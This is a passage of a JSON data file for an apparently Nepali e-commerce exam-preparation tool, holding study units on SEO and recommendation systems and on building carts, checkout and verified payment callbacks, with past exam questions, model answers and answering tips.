and e-procurement to make their B2B transactions better?","y":"E-commerce Question Bank 2082","marks":10,"rep":0},{"id":"ecom-49","q":"What is media convergence in ecommerce? How it influence ecommerce? Discuss technological and market factors that drive media convergence.","y":"E-commerce Question 2076","marks":10,"rep":0},{"id":"ecom-40","q":"Describe the factors that make U-commerce different from M-commerce?","y":"E-commerce Question 2078","marks":5,"rep":0}],"reps":[{"id":"r2","q":"How are provisions relating to the Information Technology Tribunal defined in the Electronic Transaction Act of Nepal?","count":3,"marks":5}]},{"n":7,"name":"Optimizing E-commerce Systems","rank":6,"q":8,"m":40,"share":9,"cum":93,"hook":"A librarian who has read everything decides which shelf you meet first, and notices what you take next.","idea":"Optimisation raises the odds that a given visitor buys, once before arrival by being crawled, indexed and ranked, and once after arrival by being shown the next plausible item. Collaborative filtering needs a user-item matrix, so a visitor with no history has no neighbours to borrow from, and a new item nobody bought has none either; content-based filtering compares item features with what that visitor already viewed, so it recommends before any community behaviour exists. Hybrid systems fall back on popularity or attributes until history accumulates, and both halves are measured, never assumed.","one":"SEO convinces the librarian to shelve you near the door; recommendation notices what other borrowers took with your book.","gate":{"q":"Why does collaborative filtering fail a new visitor while content-based filtering still works?","a":"Collaborative filtering needs a user-item matrix, so a visitor with no history has no neighbours to borrow from, and a new item nobody bought has none either. Content-based filtering compares item features with what that visitor already viewed, so it recommends before any community behaviour exists. Hybrid systems fall back on popularity or attributes until history accumulates."},"top":{"id":"ecom-12","q":"Consider you are hired as a SEO expert. How can you use content-based and collaborative filtering approaches to recommend products?","y":"E-commerce Question Bank 2082","marks":5,"rep":2,"ans":"Content-based filtering builds a profile from one user's views and purchases, describes each product by attributes (category, brand, price, colour, keywords via TF-IDF or embeddings) and recommends similar items. It needs product metadata, works for new products and niche catalogues, and lets me auto-generate \"similar products\" blocks and long-tail category pages that rank. Weakness: no surprises, and it depends on good data.\nCollaborative filtering uses the user-item matrix. User-based finds shoppers with similar histories; item-based finds products bought together, powering \"customers also bought\". It needs no attributes and surfaces cross-category finds, but suffers cold start and sparsity.\nPlan: content-based for first visits and new SKUs, collaborative once behaviour accrues, hybrid scoring on home, product and cart pages. Measure click-through and conversion.","skel":["Content-based uses item attributes and history","Output: similar products, long-tail pages","Collaborative uses other users' behaviour","Item-based: customers also bought","Hybrid covers cold start and sparsity"],"logic":"Disguises a recommendation-system question as an SEO brief. It checks that you can separate behaviour-based from attribute-based filtering and say when each fails.","how":"Two labelled halves, each with data used, output and failure mode, then a hybrid line. Say cold start once — it is the mark they look for.","gateA":"Content-based filtering builds a profile from one user's views and purchases, describes each product by attributes (category, brand, price, colour, keywords via TF-IDF or embeddings) and recommends similar items. It needs product metadata, works for new products and niche catalogues, and lets me auto-generate \"similar products\" blocks and long-tail category pages that rank. Weakness: no surprises, and it depends on good data.\nCollaborative filtering uses the user-item matrix. User-based finds shoppers with similar histories; item-based finds products bought together, powering \"customers also bought\". It needs no attributes and surfaces cross-category finds, but suffers cold start and sparsity.\nPlan: content-based for first visits and new SKUs, collaborative once behaviour accrues, hybrid scoring on home, product and cart pages. Measure click-through and conversion. Content-based uses item attributes and history Output: similar products, long-tail pages Collaborative uses other users' behaviour Item-based: customers also bought Hybrid covers cold start and sparsity","anti":""},"keys":["Crawling","Indexing","PageRank","On-page SEO","Off-page SEO","Technical SEO"],"ask":[{"id":"ecom-12","q":"Consider you are hired as a SEO expert. How can you use content-based and collaborative filtering approaches to recommend products?","y":"E-commerce Question Bank 2082","marks":5,"rep":2},{"id":"ecom-47","q":"What is Search Engine Optimization (SEO)? How on page SEO can be done?","y":"E-commerce Question 2078","marks":5,"rep":2},{"id":"ecom-23","q":"Describe the working mechanism of search engines.","y":"E-commerce Question Bank 2081","marks":5,"rep":0},{"id":"ecom-35","q":"What is the significance of recommendation systems in e-commerce? How is collaborative filtering different from content based?","y":"E-commerce Question 2080","marks":5,"rep":0}],"reps":[{"id":"r18","q":"Consider you are hired as a SEO expert. How can you use content-based and collaborative filtering approaches to recommend products?","count":2,"marks":5},{"id":"r28","q":"Why it is essential to perform Search Engine Optimization (SEO)? How off page SEO can be done?","count":2,"marks":5}]},{"n":4,"name":"Building E-commerce System","rank":7,"q":6,"m":30,"share":7,"cum":100,"hook":"In a big shop the boy at the counter keeps your pile; online, every click hires a new boy.","idea":"A shopping cart is a claim slip written outside the page, so the basket survives navigation, refresh and login. Checkout freezes the slip into an order with a fixed total and a legal sequence of states. The browser's return page is only a URL the browser was told to open, so a shopper can type it, replay it, or abandon the tab before it loads; payment is proved by a server-to-server callback whose signature the store verifies and applies once through an idempotency key. A shop trusting the redirect ships goods nobody paid for.","one":"A cart is a claim slip outside the page; checkout turns it into an order only a verified callback can mark paid.","gate":{"q":"Why is the browser's return page not proof that a payment succeeded?","a":"That page is only a URL the browser was told to open, so a shopper can type it, replay it, or abandon the tab before it loads. Payment is proved by a server-to-server callback whose signature the store verifies and applies once through an idempotency key. A shop trusting the redirect ships goods nobody paid for."},"top":{"id":"ecom-19","q":"What are the basic elements to be considered while developing an e-commerce website?","y":"E-commerce Question Bank 2081","marks":5,"rep":0,"ans":"• Business foundation — value proposition, target segment, product range, pricing, revenue model, budget.\n• Catalogue and content — complete product data (title, attributes, variants, price, stock), good photographs, search-friendly descriptions, a logical category tree, internal search.\n• Usability — simple navigation, filters, a cart that survives login, guest checkout, a short checkout, mobile-first layout, since most Nepali traffic is mobile.\n• Payments — eSewa, Khalti, connectIPS, cards and cash on delivery; show delivery and tax before the final step.\n• Security and trust — SSL, PCI-DSS compliant gateway, privacy policy, terms of sale, return and refund policy, contact details, reviews.\n• Operations — order management, inventory sync, courier tracking, invoicing and VAT records.\n• Legal and growth — Electronic Transactions Act 2063 compliance, analytics, SEO, hosting that scales on festival traffic.","skel":["Business: value proposition, audience, pricing","Content: catalogue, images, categories, search","Technology: cart, checkout, hosting, mobile","Money: gateway, COD, tax, shipping rules","Trust: SSL, policies, returns, support"],"logic":"A checklist question that separates students who have thought about a real launch from those who list only design. Payment integration, security and legal elements carry the marks.","how":"Group into five buckets — business, content, technology, money, trust — and give two items each. Buckets stop you rambling and look organised.","gateA":"• Business foundation — value proposition, target segment, product range, pricing, revenue model, budget.\n• Catalogue and content — complete product data (title, attributes, variants, price, stock), good photographs, search-friendly descriptions, a logical category tree, internal search.\n• Usability — simple navigation, filters, a cart that survives login, guest checkout, a short checkout, mobile-first layout, since most Nepali traffic is mobile.\n• Payments — eSewa, Khalti, connectIPS, cards and cash on delivery; show delivery and tax before the final step.\n• Security and trust — SSL, PCI-DSS compliant gateway, privacy policy, terms of sale, return and refund policy, contact details, reviews.\n• Operations — order management, inventory sync, courier tracking, invoicing and VAT records.\n• Legal and growth — Electronic Transactions Act 2063 compliance, analytics, SEO, hosting that scales on festival traffic. Business: value proposition, audience, pricing Content: catalogue, images, categories, search Technology: cart, checkout, hosting, mobile Money: gateway, COD, tax, shipping rules Trust: SSL, policies, returns, support","anti":""},"keys":["Static catalogue","Dynamic catalogue","Server-side cart","Cart merging","Order state machine","Idempotency key"],"ask":[{"id":"ecom-19","q":"What are the basic elements to be considered while developing an e-commerce website?","y":"E-commerce Question Bank 2081","marks":5,"rep":0},{"id":"ecom-31","q":"What is catalog in e-commerce? How are catalogs created?","y":"E-commerce Question 2080","marks":5,"rep":0},{"id":"ecom-52","q":"What are the different types of digital documents used in corporate library?","y":"E-commerce Question 2076","marks":5,"rep":0},{"id":"ecom-63","q":"Why it is important to build catalogs in e-commerce systems? How static catalog differs from dynamic catalog?","y":"E-commerce Question 2079","marks":5,"rep":0}],"reps":[]}]}}};
